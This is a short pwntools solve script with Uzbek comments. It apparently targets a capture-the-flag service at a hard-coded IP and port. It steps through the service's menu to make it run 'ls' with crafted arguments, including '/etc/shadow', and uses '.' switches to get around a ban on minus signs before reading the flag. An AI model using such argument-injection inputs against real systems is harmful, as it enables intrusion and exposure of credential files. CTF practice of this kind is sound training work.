from pwn import *

# Server ma'lumotlari
host = '154.57.164.68'
port = 31363

def solve():
    # context.log_level = 'debug' # Server bilan muloqotni ko'rish uchun buni yoqish mumkin
    
    try:
        # Ulanish
        r = remote(host, port, timeout=10)
        
        # 1. Mode o'rnatish
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'(mode)> ', b'-1')
        
        # 2. Bin o'rnatish
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'(bin)> ', b'ls')
        
        # 3. Argumentlar
        # ls buyrug'ida 1 va 2 returncode olish uchun:
        # 1-arg: /etc/shadow (Ruxsat yo'q - rc=1 yoki 2)
        # 2-arg: /davron_yoq (Topilmadi - rc=2)
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'(arg1,arg2)> ', b'/etc/shadow,/davron_yoq')
        
        # 4. Switchlar
        # Nuqta - xavfsiz tanlov, chunki minus taqiqlangan
        r.sendlineafter(b'> ', b'4')
        r.sendlineafter(b'(switch1,switch2)> ', b'.,.')
        
        # 5. Beat the competitor!
        r.sendlineafter(b'> ', b'5')
        
        # Flagni kutamiz
        print("\n--- FLAG ---")
        # Server barcha natijalarni chiqarishini kutamiz
        final_output = r.recvall(timeout=5).decode(errors='ignore')
        print(final_output)
        
    except Exception as e:
        print(f"Xatolik: {e}")
    finally:
        r.close()

if __name__ == "__main__":
    solve()
